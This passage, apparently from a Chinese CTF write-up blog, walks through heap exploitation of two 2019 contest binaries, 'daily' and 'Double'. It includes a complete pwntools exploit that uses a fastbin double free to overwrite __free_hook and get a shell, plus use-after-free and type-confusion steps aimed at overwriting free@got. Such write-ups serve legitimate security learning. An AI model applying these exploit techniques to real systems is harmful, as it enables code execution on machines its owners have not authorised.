class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"e\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = u64(p.recvuntil(<span class=\"string\">\"2 :\"</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">\"bbbbbbbb\"</span>)[<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - (<span class=\"number\">0xd0</span> + <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = libc_addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap_addr)</span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>利用上述提到的漏洞，在堆上构造fake chunk和指向fake chunk的指针，然后构建fastbin 2free.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">fake_chunk += <span class=\"string\">\"a\"</span> * <span class=\"number\">0x60</span></span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(heap_addr + <span class=\"number\">0x1f0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bss = <span class=\"number\">0x602068</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x200</span>, fake_chunk) <span class=\"comment\"># 0x1a0</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = (heap_addr + <span class=\"number\">0x1f0</span> + <span class=\"number\">0x60</span> + <span class=\"number\">0x18</span> - bss) / <span class=\"number\">16</span></span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">5</span>, fake_chunk)</span><br><span class=\"line\">free(str(offset))</span><br></pre></td></tr></table></figure>\n<p>此时：</p>\n<p>fd -&gt; fake_chunk -&gt;idx0 -&gt;fake_chunk</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap bins</span><br><span class=\"line\">[+] No Tcache in this version of libc</span><br><span class=\"line\">────────────────────── Fastbins for arena 0x7fc5dc6d9b20 ──────────────────────</span><br><span class=\"line\">Fastbins[idx=0, size=0x10] 0x00</span><br><span class=\"line\">Fastbins[idx=1, size=0x20] 0x00</span><br><span class=\"line\">Fastbins[idx=2, size=0x30] 0x00</span><br><span class=\"line\">Fastbins[idx=3, size=0x40] 0x00</span><br><span class=\"line\">Fastbins[idx=4, size=0x50] 0x00</span><br><span class=\"line\">Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a0010, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  →  [loop detected]</span><br></pre></td></tr></table></figure>\n<p>但是本题操蛋的是，四个one_gadget对malloc_hook都不行，所以只能尝试free_hook。但是不能直接劫持free_hook,所以我们尝试修改top，劫持到free_hook——不过，此路也走不通，因为没开pie，堆地址不是0x55开头。其实，sb了，直接劫持到bss段即可用change和add方法实现任意读写</p>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./daily\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./daily\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"of daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"of daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"e\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = u64(p.recvuntil(<span class=\"string\">\"2 :\"</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">\"bbbbbbbb\"</span>)[<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x120</span></span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = libc_addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">free_hook = libc.symbols[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">bss = <span class=\"number\">0x602068</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x4526a</span>\t <span class=\"comment\"># 0x4526a 0xf02a4 0xf1147</span></span><br><span class=\"line\">one_gadget += libc.address</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make fake chunk in heap</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">fake_chunk += <span class=\"string\">\"a\"</span> * <span class=\"number\">0x60</span></span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(heap_addr + <span class=\"number\">0x1f0</span>) <span class=\"comment\"># fake array_item</span></span><br><span class=\"line\">add(<span class=\"number\">0x200</span>, fake_chunk) <span class=\"comment\"># 0x1f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make fastbin double free</span></span><br><span class=\"line\">offset = (heap_addr + <span class=\"number\">0x1f0</span> + <span class=\"number\">0x60</span> + <span class=\"number\">0x18</span> - bss) / <span class=\"number\">16</span></span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">5</span>, fake_chunk)</span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fastbin attack</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0x6020d8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, payload) <span class=\"comment\"># idx0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"C\"</span> * <span class=\"number\">0x10</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"C\"</span> * <span class=\"number\">0x10</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">\"D\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># mark in bss</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(free_hook))</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">8</span>, p64(one_gadget))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02-Double\"><a href=\"#0x02-Double\" class=\"headerlink\" title=\"0x02  Double\"></a>0x02  Double</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/Double$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/Double/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>注意部分开启了RELRO，且没有开启PIE。从题目名字推测应该也是用double free。</p>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>通过逆向，ptr的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ptr</span>&#123;</span></span><br><span class=\"line\">  num; \t\t\t<span class=\"comment\">// + 0x0</span></span><br><span class=\"line\">  size; \t\t<span class=\"comment\">// + 0x4</span></span><br><span class=\"line\">  *content; <span class=\"comment\">// + 0x8</span></span><br><span class=\"line\">  *next;    <span class=\"comment\">// + 0x10</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h4><p>首先malloc一个0x18的chunk，然后用input函数读入chunk的内容，注意当读入0x100个字节而没有\\n时，会返回0xff。</p>\n<p>然后如果是第一次申请，或者该次与prev_ptr的字符串内容不同时，会根据size+1创建一个malloc一个chunk，然后从栈上拷贝size+1的数据到新创建的堆块中，然后再ptr结构体中设置好size和新chunk的指针。如果head_ptr不为null，会令num= prev_ptr的num+ 1，并且将prev_ptr的next指针设置为当前指针；否则，令num为0，然后令head_ptr = 当前指针。最后，还会令prev_ptr指向当前指针。</p>\n<p>如果不是第一次申请，或者该次与prev_ptr的字符串内容相同，那么直接令num++，size = prev_ptr.size，content也指向prev_ptr.content，next = null，然后将prev_ptr的next指针指向当前ptr，最后，令prev_ptr指向当前指针。</p>\n<p>由上述分析，我们知道该题是用一个单向链表结构管理堆块的， bss段存储链表的头指针head_ptr和尾指针prev_ptr，每个ptr结构中都存储了next指针，这时我感觉该题应该是要构造类型混淆。另外还有一个点就是如果两次创建相同内容的堆块，则会构造出两个指针指向同一块内存空间。另外，num都是根据prev_ptr判断的。</p>\n<h4 id=\"list\"><a href=\"#list\" class=\"headerlink\" title=\"list\"></a>list</h4><p>从head_ptr起开始遍历链表，找到相应编号的chunk，并puts出来。</p>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>从head_ptr起开始遍历，找到后先读入chunk内容，如果size小于等于原来的size，直接memcpy；否则，malloc一个新chunk，然后copy并记录到相应ptr上。</p>\n<h4 id=\"delete-1\"><a href=\"#delete-1\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>从head_ptr开始遍历，找到后先free content堆块，再free ptr堆块。在删除头和非头时操作不同。这里明显存在UAF漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">delete</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *ptr; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 Prev_ptr; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !head_ptr )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"List empty\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Info index: \"</span>);</span><br><span class=\"line\">  index = sub_401A6A();</span><br><span class=\"line\">  ptr = (<span class=\"keyword\">void</span> *)head_ptr;</span><br><span class=\"line\">  Prev_ptr = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Index not found\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( index == *(_DWORD *)ptr )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    Prev_ptr = (__int64)ptr;</span><br><span class=\"line\">    ptr = (<span class=\"keyword\">void</span> *)*((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Prev_ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_QWORD *)(Prev_ptr + <span class=\"number\">16</span>) = *((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr == (<span class=\"keyword\">void</span> *)prev_ptr )</span><br><span class=\"line\">      prev_ptr = Prev_ptr;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)ptr + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    head_ptr = *((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr == (<span class=\"keyword\">void</span> *)prev_ptr )</span><br><span class=\"line\">      prev_ptr = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)ptr + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先需要leak libc，然后改got表为one_gadget即可。思考一下怎样布局，leak libc。</p>\n<h4 id=\"leak-libc-1\"><a href=\"#leak-libc-1\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>因为leak的都是content指针指向的堆块，所以只要让两个content指针指向同一个unsorted bin，先将它free，再show出来即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"b\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># head is 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流-1\"><a href=\"#劫持控制流-1\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>我们完全可以按daily的思路，构造fastbin attack，然后就可以劫持到任意地址。首先尝试直接劫持到malloc_hook之前的地址，但是由于必须写很多数据，失败。</p>\n<p>所以不能再用fastbin attack的思路了，尝试构造类型混淆。</p>\n<p>首先创建三个0x10的content</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 4</span><br><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 5</span><br><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 6</span><br><span class=\"line\">free(5)</span><br><span class=\"line\">free(6)</span><br></pre></td></tr></table></figure>\n<p>然后free掉，使得fastbin为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p6-&gt;c4-&gt;p5-&gt;c4</span><br></pre></td></tr></table></figure>\n<p>然后再分配：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x20 * &quot;a&quot; + &quot;\\n&quot;) # 5</span><br></pre></td></tr></table></figure>\n<p>true_p5 = old_p6 true_c5 = other</p>\n<p>此时，fastbin为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c4-&gt;p5-&gt;c4</span><br></pre></td></tr></table></figure>\n<p>再分配</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x10 * &quot;b&quot; + &quot;\\n&quot;) # 6</span><br></pre></td></tr></table></figure>\n<p>true_p6 = ord_c4，此时，修改c4就可以修改true_p6，然后也就实现了任意地址读写</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"c\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br></pre></td></tr></table></figure>\n<p>由于atoi只能输入5位，考虑劫持别的got。所以最后选择覆盖free@got，然后布置/bin/sh\\x00在chunk上即可。</p>\n<h4 id=\"完整exp-1\"><a href=\"#完整exp-1\" class=\"headerlink\" 